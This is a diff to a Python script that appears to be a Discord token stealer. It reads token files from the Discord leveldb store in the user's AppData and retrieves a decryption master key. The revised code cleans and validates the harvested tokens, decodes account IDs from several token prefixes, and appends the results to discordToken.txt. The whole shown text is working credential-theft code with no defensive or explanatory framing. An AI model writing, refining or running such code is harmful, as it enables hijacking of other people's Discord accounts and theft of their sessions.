@@ -80,7 +80,6 @@ class Discord:
         username = get_sys_username()
         path: str = "c:/Users/" + username + "/AppData/Roaming/discord/Local Storage/leveldb/"  # Here is where the tokens are stored.
         mkey = get_masterKey()
-        equals_sign = None
         for file in os.listdir(path):
             if file[-3:] in ['ldb', 'log']:
                 with open(path + file, errors='ignore') as f:
@@ -144,19 +143,33 @@ if __name__ == '__main__':
             pass
 
         try:
-            token = token.replace("%", "")
+            token = token.replace('%', '')
+        except ValueError:
+            pass
+
+
+        try:
+            token = token.replace('"', '')
         except ValueError:
             pass
 
         token_resp = token_validator(token)
         uid_list = token.split('.')
         uid = uid_list[0]
-
-        try:
+        if uid.startswith('NT'):
             dec_uid = base64.b64decode(uid).decode('utf-8')
-        except binascii.Error:
-            uid = ''.join(uid_list)[:29]
-            dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
+        elif uid.startswith('MT'):
+                uid = uid + '.' + uid_list[1][:2]
+                dec_uid = base64.b64decode(uid).decode('utf-8')
+        elif uid.startswith('OD') or uid.startswith('O'):
+            uid = uid + '.' + uid_list[1][:4]
+            dec_uid = base64.b64decode(uid).decode('utf-8')
+        else:
+            try:
+                dec_uid = base64.b64decode(uid).decode('utf-8')
+            except binascii.Error:
+                uid = ''.join(uid_list)[:28]
+                dec_uid = base64.b64decode(uid)[:-2].decode('utf-8')
 
         os.chdir(str('C:\\Users\\' + get_sys_username()))
         with open('discordToken.txt', 'a', encoding='utf-8', errors='ignore') as f:
